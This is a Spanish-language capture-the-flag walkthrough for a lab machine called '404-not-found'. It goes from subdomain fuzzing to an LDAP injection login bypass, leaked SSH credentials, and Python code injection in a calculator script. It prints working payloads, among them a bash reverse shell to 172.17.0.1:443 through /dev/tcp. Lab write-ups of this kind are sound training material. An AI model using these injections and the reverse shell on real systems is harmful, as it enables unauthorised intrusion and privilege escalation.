nmap: 22,80

![image](https://github.com/user-attachments/assets/2b6eed0f-c4b9-4bcb-b84d-3fbfe9437982)


---
al hacer el nmap vemos que el puerto 80 tiene una pagina con "hl" al final

![image](https://github.com/user-attachments/assets/00fb62a3-401f-40ce-a6c6-046641820ccd)

lo que tenemos que agregar esa redirección en el  "/etc/hosts"
http://404-not-found.hl/

en la pagina principal ahora vemos eso y aceptamos el desafio:

![image](https://github.com/user-attachments/assets/ca2f05b7-9e39-4c8b-b1c6-ab6cef4f2fd4)


en la pagina hay cuadros con "pistas". hay una en código base64 

![image](https://github.com/user-attachments/assets/21c6bc7f-4b39-4991-b972-2e4f1fbf9b75)


que lo sacamos:
>echo "`UXVlIGhhY2VzPywgbWlyYSBlbiBsYSBVUkwu`" | base64 -d 

![image](https://github.com/user-attachments/assets/6ec0aa26-5305-4c98-8661-c514c470e5e8)


y nos da: Que haces?, mira en la URL. 

hacemos un:


    - wfuzz -c -u 404-not-found.hl -H "HOST: FUZZ.404-not-found.hl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 28

nos da: info
![[resultado wff.png]]

metemos ese info en /etc/host como el primer URL que tenemos.
http://info.404-not-found.hl/
quedaría: info.404-not-found.hl
![[login.png]]

nos manda a un login y vamos probando credenciales por default. 
vemos el código fuente y al final hay un mensaje:
> I believe this login works with LDAP  

![[codigo fuente.png]]

buscamos credenciales de inyección de LDAP
probamos las inyección que tiene: https://book.hacktricks.xyz/v/es/pentesting-web/ldap-injection

![[credenciales 1 1.png]]
y sirve: 

        user=*)(|(&
         pass=pwd)

en el panel de admin nos da las credenciales: 

       - Nombre de usuario: `404-page`
       - Contraseña: `not-found-page-secret`

![[credenciales 2.png]]

entramos por el ssh en el terminal y ahora buscamos como escalar hacia root.
![[conexion .png]]

como se ve hay un calculadora.py se refiere a python y solo podemos ejecutar.

![[ejecutable 1.png]]

encontramos un comando para ejecutar con python del programa que encontramos:
https://snyk.io/blog/command-injection-python-prevention-examples/

![[codigo python 1.png]]

comando de ejecución:

     __import__('os').popen('ls').read()

![[prueba 1 1.png]]

lo modificamos para una reverse shell para verificar: 

         __import__('os').popen("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'").read()

olocamos el puerto en escucha y estamos dentro del usuario 200-ok

![[conexion nc.png]]

 buscamos como escalar y aparece un txt que se llama: 
>boss.txt que contiene: what is rooteable

![[boss.png]]

probamos rooteable como contraseña de root:

![[root.png]]

su root / rooteable y somos root!: 
